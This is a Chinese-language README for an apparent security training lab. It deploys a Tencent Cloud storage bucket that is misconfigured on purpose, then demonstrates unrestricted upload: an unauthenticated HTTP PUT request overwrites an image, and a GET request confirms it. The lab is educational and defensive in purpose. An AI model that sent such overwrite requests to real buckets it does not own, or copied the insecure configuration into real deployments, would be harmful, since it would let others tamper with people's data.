# 描述

[English](./README.md) | 中文

这是一个可以快速帮你构建存储桶任意文件上传场景的脚本

## 部署环境

```bash
cd /TerraformGoat/tencentcloud/cos/unrestricted_file_upload/
```

写入你的腾讯云账户AK与KEY

```shell
vim terraform.tfvars
```

部署环境

```bash
terraform init
terraform apply
```

访问/hx.png

![image-20220425195047346](../../../images/image-20220425195047346.png)

现在我们可以通过PUT方法来覆盖这个文件

![image-20220425195122239](../../../images/image-20220425195122239.png)

```http
PUT /hx.png HTTP/1.1
Host: uzjusecqwe-.cos.ap-nanjing.myqcloud.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:99.0) Gecko/20100101 Firefox/99.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Length: 13

HxSecurityLab
```

随后使用GET方法来获取我们覆盖的图片

![image-20220425195153269](../../../images/image-20220425195153269.png)

## 销毁挑战

```bash
terraform destroy
```

随后回车，输入yes等待销毁即可
